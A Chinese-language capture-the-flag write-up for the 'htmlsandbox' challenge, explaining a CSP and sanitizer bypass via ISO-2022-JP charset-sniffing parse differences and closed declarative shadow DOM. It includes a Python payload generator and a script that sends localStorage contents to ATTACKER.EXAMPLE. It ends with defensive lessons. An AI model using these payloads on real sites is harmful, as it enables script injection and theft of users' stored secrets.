# htmlsandbox

## 题目简述

应用允许上传 HTML，但要求 `<head>` 的第一个元素是：

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'none'">
```

服务端还用无 JavaScript 的 Chromium 打开一个 Base64 `data:` URL，确认没有 `script/noscript/frame/iframe/object/embed`、没有事件处理器，并且只产生一次请求。上传成功后，HTML 会在同源 `/upload/<id>` 下返回。管理员机器人先把 flag 写入该站点的 `localStorage`，再访问选手页面。

解法需要同时绕过两层检查：利用 ISO-2022-JP 编码探测造成 `data:` 整体解析与 HTTP 增量解析的差异，使验证时 CSP 存在、机器人访问时 CSP 消失；再用 closed declarative shadow DOM 把脚本藏到 `document.querySelector('script')` 无法遍历的位置。

## 解题过程

### 1. 明确验证与真实访问的差异

验证器执行：

```js
html = btoa(html);
await page.goto('data:text/html;base64,' + html);

document.querySelector('head').firstElementChild.outerHTML === CSP_META
document.querySelector('script, noscript, frame, iframe, object, embed') === null
document.querySelector(EVENT_SELECTOR) === null
```

此时整个 Base64 文档一次性可用，而且页面 JavaScript 被禁用。上传后的真实页面则由 Express `res.end(html)` 通过网络返回，Chromium 会边收数据边进行编码探测和 HTML tokenization；管理员访问时 JavaScript 正常开启。这两个执行环境不是等价的。

### 2. 用迟到的 ISO-2022-JP 声明制造解析差异

有效载荷的骨架如下：

```html
<html><head>
<!-- 约 40000 个安全 ASCII 字符 -->
</z ESC$@ z="zzz ESC(B >
<meta http-equiv="Content-Security-Policy" content="default-src 'none'">
<!-- 再放约 40000 个安全 ASCII 字符 -->
<meta http-equiv="Content-Type" content="text/html; charset=ISO-2022-JP">
</head>...
```

其中 `ESC$@` 是字节 `1b 24 40`，切换到 ISO-2022-JP 的双字节状态；`ESC(B` 是 `1b 28 42`，切回 ASCII。两段超长注释把伪 CSP 和真正的 charset 声明推到不同的增量解析阶段。

在验证使用的 `data:` 文档中，浏览器拿到完整字节后按 ISO-2022-JP 解码，转义序列改变中间引号与结束符的 tokenization，伪造的 `</z ...>` 能正常结束；紧随其后的 CSP meta 成为 `<head>` 第一个元素，所以严格检查通过。

在通过 HTTP 增量加载时，前一块内容已按默认编码进入 tokenizer，浏览器稍后看到 charset meta 时不会回滚已解析的块。此时畸形 `</z ... z="zzz ...>` 把中间的 CSP 字节吞进未结束的标签属性，DOM 中不再存在 CSP meta。后续脚本因此不受 `default-src 'none'` 限制。

生成这些原始字节时不要先经过 Unicode 字符串的错误转码。官方生成器直接使用 `bytes`：

```python
import random
import string

alphabet = string.digits + string.ascii_letters
pad = lambda: ''.join(random.choice(alphabet) for _ in range(40000)).encode()

html  = b'<html><head><!-- ' + pad() + b' -->'
html += b'</z \x1b$@ z="zzz \x1b(B >'
html += b'<meta http-equiv="Content-Security-Policy" '
html += b'content="default-src \'none\'">'
html += b'<!-- ' + pad() + b' -->'
html += b'<meta http-equiv="Content-Type" '
html += b'content="text/html; charset=ISO-2022-JP">'
```

### 3. 用 closed declarative shadow DOM 隐藏脚本

即使解决 CSP，验证器仍会全局查询 `script`。普通 `<template>` 内容虽然不在主 DOM 查询结果中，但其中脚本默认是惰性的。使用 declarative shadow DOM：

```html
<body>
  <template shadowrootmode="closed">
    <script>/* payload */</script>
```

解析器会把模板内容变成宿主的 closed shadow root。`document.querySelector('script')` 不会穿透这个封闭 shadow tree，因此返回 `null`；验证阶段 JavaScript 又被禁用，不会触发副作用。管理员正常加载同一页面时，shadow root 内的脚本可以执行。

官方样例使用 `alert(1)` 证明执行。实际取 flag 时改成同源存储读取和外带：

```html
<template shadowrootmode="closed">
  <script>
    location = 'https://ATTACKER.EXAMPLE/collect?flag=' +
      encodeURIComponent(localStorage.getItem('flag'));
  </script>
```

验证器中脚本不会运行，因此请求计数仍为 1；管理员页面中 CSP 已因增量解析差异消失，跨站导航或请求不再被阻止。

### 4. 上传并交给管理员访问

把上述三部分按二进制方式拼接，保持开头恰好为 `<html>`，通过表单 URL 编码提交到 `/upload`。服务端返回 `/upload/<随机 id>` 后，把这个同源 URL 交给管理员机器人。机器人已经在该 origin 写入：

```js
localStorage.setItem('flag', FLAG);
```

它访问上传页后，closed shadow root 中的脚本读取同一份 `localStorage`，接收端即可得到完整 flag。

## 方法总结

本题不是单一 CSP 绕过，而是两个解析边界叠加。ISO-2022-JP 状态转义与迟到 charset 让“完整 data URL 验证”和“网络增量加载”生成不同 DOM：前者保留 CSP，后者吞掉 CSP。closed declarative shadow DOM 又让脚本脱离文档级 `querySelector` 的遍历范围。

安全验证必须针对最终交付方式和相同浏览器配置执行，不能先把内容换成 `data:` URL再假设 DOM 等价；黑名单式 DOM 查询也必须考虑 template、shadow tree 与解析器修复行为。更可靠的方案是服务端生成固定结构、把用户内容当文本，并把不可信页面放到无敏感状态的独立 origin。
